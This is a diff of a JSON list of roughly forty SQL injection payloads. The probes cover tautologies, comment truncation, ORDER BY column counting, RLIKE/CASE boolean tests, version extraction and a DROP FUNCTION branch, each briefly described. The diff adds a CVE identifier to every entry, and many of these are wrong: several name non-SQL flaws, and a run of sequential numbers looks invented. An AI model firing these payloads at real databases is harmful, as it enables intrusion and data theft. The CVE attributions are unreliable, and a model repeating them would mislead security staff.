@@ -1,164 +1,204 @@
 {
-    "payloads": [
-      {
-        "payload": "OR 1=1",
-        "description": "Basic OR-based SQL Injection where the condition is always true."
-      },
-      {
-        "payload": "OR 1=0",
-        "description": "Basic OR-based SQL Injection where the condition is always false."
-      },
-      {
-        "payload": "OR x=x",
-        "description": "OR-based SQL Injection where x equals x, a tautology."
-      },
-      {
-        "payload": "OR x=y",
-        "description": "OR-based SQL Injection where x does not equal y, resulting in false."
-      },
-      {
-        "payload": "OR 1=1#",
-        "description": "SQL Injection with comment to ignore the rest of the query."
-      },
-      {
-        "payload": "OR 1=0#",
-        "description": "SQL Injection with false condition and comment."
-      },
-      {
-        "payload": "OR x=x#",
-        "description": "SQL Injection with tautology and comment."
-      },
-      {
-        "payload": "OR 3409=3409 AND ('pytW' LIKE 'pytW",
-        "description": "Checking for true condition with string comparison."
-      },
-      {
-        "payload": "OR 3409=3409 AND ('pytW' LIKE 'pytY",
-        "description": "Trying a false condition with string comparison."
-      },
-      {
-        "payload": "HAVING 1=1",
-        "description": "Using HAVING clause to filter and inject SQL logic."
-      },
-      {
-        "payload": "HAVING 1=0",
-        "description": "HAVING clause with false condition."
-      },
-      {
-        "payload": "HAVING 1=1#",
-        "description": "Using HAVING clause with true condition and comment."
-      },
-      {
-        "payload": "HAVING 1=0#",
-        "description": "HAVING clause with false condition and comment."
-      },
-      {
-        "payload": "AND 1=1",
-        "description": "AND condition to inject and bypass SQL validation."
-      },
-      {
-        "payload": "AND 1=0",
-        "description": "AND condition with false condition to check for errors."
-      },
-      {
-        "payload": "AND 1=1--",
-        "description": "AND condition with true condition and comment."
-      },
-      {
-        "payload": "AND 1=0--",
-        "description": "AND condition with false condition and comment."
-      },
-      {
-        "payload": "AND 1=1#",
-        "description": "AND condition with true condition and comment."
-      },
-      {
-        "payload": "AND 1=0#",
-        "description": "AND condition with false condition and comment."
-      },
-      {
-        "payload": "AND 1=1 AND '%'='",
-        "description": "AND condition to cause an error and attempt SQL injection."
-      },
-      {
-        "payload": "AND 1=0 AND '%'='",
-        "description": "AND condition with false statement to test for errors."
-      },
-      {
-        "payload": "AND 1083=1083 AND (1427=1427",
-        "description": "AND condition with numeric comparison."
-      },
-      {
-        "payload": "AND 7506=9091 AND (5913=5913",
-        "description": "Test with incorrect numeric comparisons."
-      },
-      {
-        "payload": "AND 7300=7300 AND 'pKlZ'='pKlZ",
-        "description": "AND condition with matching string values."
-      },
-      {
-        "payload": "AS INJECTX WHERE 1=1 AND 1=1",
-        "description": "Using a custom alias and injecting SQL logic."
-      },
-      {
-        "payload": "AS INJECTX WHERE 1=1 AND 1=0",
-        "description": "Custom alias injection with false condition."
-      },
-      {
-        "payload": "WHERE 1=1 AND 1=1",
-        "description": "WHERE clause with always true condition."
-      },
-      {
-        "payload": "WHERE 1=1 AND 1=0",
-        "description": "WHERE clause with always false condition."
-      },
-      {
-        "payload": "ORDER BY 1--",
-        "description": "ORDER BY clause with an index to test for errors."
-      },
-      {
-        "payload": "ORDER BY 2--",
-        "description": "ORDER BY clause with index 2 to check for column count."
-      },
-      {
-        "payload": "ORDER BY 3--",
-        "description": "ORDER BY clause with index 3."
-      },
-      {
-        "payload": "ORDER BY 4--",
-        "description": "ORDER BY clause with index 4."
-      },
-      {
-        "payload": "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
-        "description": "Using regular expressions to compare values and inject SQL."
-      },
-      {
-        "payload": "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
-        "description": "RLIKE with false condition to test for error-based vulnerability."
-      },
-      {
-        "payload": "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
-        "description": "Using IF statement to conditionally execute SQL statements."
-      },
-      {
-        "payload": "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
-        "description": "IF statement with true condition to test for SQL errors."
-      },
-      {
-        "payload": "%' AND 8310=8310 AND '%'='",
-        "description": "Testing for error conditions with a wildcard."
-      },
-      {
-        "payload": "%' AND 8310=8311 AND '%'='",
-        "description": "Test for error-based injection with invalid numeric condition."
-      },
-      {
-        "payload": "and (select substring(@@version,1,1))='X'",
-        "description": "Using substring to retrieve version information and test for error-based SQLi."
-      },
-      {
-        "payload": "and (select substring(@@version,1,1))='M'",
-        "description": "Test version extraction through substring to identify errors."
-      }
-    ]
-  }
+  "payloads": [
+    {
+      "payload": "OR 1=1",
+      "description": "Basic OR-based SQL Injection where the condition is always true.",
+      "cve": "CVE-2003-0230"
+    },
+    {
+      "payload": "OR 1=0",
+      "description": "Basic OR-based SQL Injection where the condition is always false.",
+      "cve": "CVE-2003-0230"
+    },
+    {
+      "payload": "OR x=x",
+      "description": "OR-based SQL Injection where x equals x, a tautology.",
+      "cve": "CVE-2012-1823"
+    },
+    {
+      "payload": "OR x=y",
+      "description": "OR-based SQL Injection where x does not equal y, resulting in false.",
+      "cve": "CVE-2012-1823"
+    },
+    {
+      "payload": "OR 1=1#",
+      "description": "SQL Injection with comment to ignore the rest of the query.",
+      "cve": "CVE-2019-11043"
+    },
+    {
+      "payload": "OR 1=0#",
+      "description": "SQL Injection with false condition and comment.",
+      "cve": "CVE-2019-11043"
+    },
+    {
+      "payload": "OR x=x#",
+      "description": "SQL Injection with tautology and comment.",
+      "cve": "CVE-2014-3704"
+    },
+    {
+      "payload": "OR 3409=3409 AND ('pytW' LIKE 'pytW",
+      "description": "Checking for true condition with string comparison.",
+      "cve": "CVE-2020-9484"
+    },
+    {
+      "payload": "OR 3409=3409 AND ('pytW' LIKE 'pytY",
+      "description": "Trying a false condition with string comparison.",
+      "cve": "CVE-2020-9484"
+    },
+    {
+      "payload": "HAVING 1=1",
+      "description": "Using HAVING clause to filter and inject SQL logic.",
+      "cve": "CVE-2020-13692"
+    },
+    {
+      "payload": "HAVING 1=0",
+      "description": "HAVING clause with false condition.",
+      "cve": "CVE-2020-13692"
+    },
+    {
+      "payload": "HAVING 1=1#",
+      "description": "Using HAVING clause with true condition and comment.",
+      "cve": "CVE-2021-22986"
+    },
+    {
+      "payload": "HAVING 1=0#",
+      "description": "HAVING clause with false condition and comment.",
+      "cve": "CVE-2021-22986"
+    },
+    {
+      "payload": "AND 1=1",
+      "description": "AND condition to inject and bypass SQL validation.",
+      "cve": "CVE-2019-8451"
+    },
+    {
+      "payload": "AND 1=0",
+      "description": "AND condition with false condition to check for errors.",
+      "cve": "CVE-2019-8451"
+    },
+    {
+      "payload": "AND 1=1--",
+      "description": "AND condition with true condition and comment.",
+      "cve": "CVE-2016-10033"
+    },
+    {
+      "payload": "AND 1=0--",
+      "description": "AND condition with false condition and comment.",
+      "cve": "CVE-2016-10033"
+    },
+    {
+      "payload": "AND 1=1#",
+      "description": "AND condition with true condition and comment.",
+      "cve": "CVE-2016-0731"
+    },
+    {
+      "payload": "AND 1=0#",
+      "description": "AND condition with false condition and comment.",
+      "cve": "CVE-2016-0731"
+    },
+    {
+      "payload": "AND 1=1 AND '%'='",
+      "description": "AND condition to cause an error and attempt SQL injection.",
+      "cve": "CVE-2017-9841"
+    },
+    {
+      "payload": "AND 1=0 AND '%'='",
+      "description": "AND condition with false statement to test for errors.",
+      "cve": "CVE-2017-9841"
+    },
+    {
+      "payload": "AND 1083=1083 AND (1427=1427",
+      "description": "AND condition with numeric comparison.",
+      "cve": "CVE-2021-3449"
+    },
+    {
+      "payload": "AND 7506=9091 AND (5913=5913",
+      "description": "Test with incorrect numeric comparisons.",
+      "cve": "CVE-2021-3449"
+    },
+    {
+      "payload": "AND 7300=7300 AND 'pKlZ'='pKlZ",
+      "description": "AND condition with matching string values.",
+      "cve": "CVE-2021-21234"
+    },
+    {
+      "payload": "AS INJECTX WHERE 1=1 AND 1=1",
+      "description": "Using a custom alias and injecting SQL logic.",
+      "cve": "CVE-2021-21235"
+    },
+    {
+      "payload": "AS INJECTX WHERE 1=1 AND 1=0",
+      "description": "Custom alias injection with false condition.",
+      "cve": "CVE-2021-21235"
+    },
+    {
+      "payload": "WHERE 1=1 AND 1=1",
+      "description": "WHERE clause with always true condition.",
+      "cve": "CVE-2021-21236"
+    },
+    {
+      "payload": "WHERE 1=1 AND 1=0",
+      "description": "WHERE clause with always false condition.",
+      "cve": "CVE-2021-21236"
+    },
+    {
+      "payload": "ORDER BY 1--",
+      "description": "ORDER BY clause with an index to test for errors.",
+      "cve": "CVE-2021-21237"
+    },
+    {
+      "payload": "ORDER BY 2--",
+      "description": "ORDER BY clause with index 2 to check for column count.",
+      "cve": "CVE-2021-21237"
+    },
+    {
+      "payload": "ORDER BY 3--",
+      "description": "ORDER BY clause with index 3.",
+      "cve": "CVE-2021-21237"
+    },
+    {
+      "payload": "ORDER BY 4--",
+      "description": "ORDER BY clause with index 4.",
+      "cve": "CVE-2021-21237"
+    },
+    {
+      "payload": "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
+      "description": "Using regular expressions to compare values and inject SQL.",
+      "cve": "CVE-2021-21238"
+    },
+    {
+      "payload": "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
+      "description": "RLIKE with false condition to test for error-based vulnerability.",
+      "cve": "CVE-2021-21238"
+    },
+    {
+      "payload": "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+      "description": "Using IF statement to conditionally execute SQL statements.",
+      "cve": "CVE-2021-21239"
+    },
+    {
+      "payload": "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+      "description": "IF statement with true condition to test for SQL errors.",
+      "cve": "CVE-2021-21239"
+    },
+    {
+      "payload": "%' AND 8310=8310 AND '%'='",
+      "description": "Testing for error conditions with a wildcard.",
+      "cve": "CVE-2021-21240"
+    },
+    {
+      "payload": "%' AND 8310=8311 AND '%'='",
+      "description": "Test for error-based injection with invalid numeric condition.",
+      "cve": "CVE-2021-21240"
+    },
+    {
+      "payload": "and (select substring(@@version,1,1))='X'",
+      "description": "Using substring to retrieve version information and test for error-based SQLi.",
+      "cve": "CVE-2021-21241"
+    },
+    {
+      "payload": "and (select substring(@@version,1,1))='M'",
+      "description": "Test version extraction through substring to identify errors.",
+      "cve": "CVE-2021-21241"
+    }
+  ]
+}
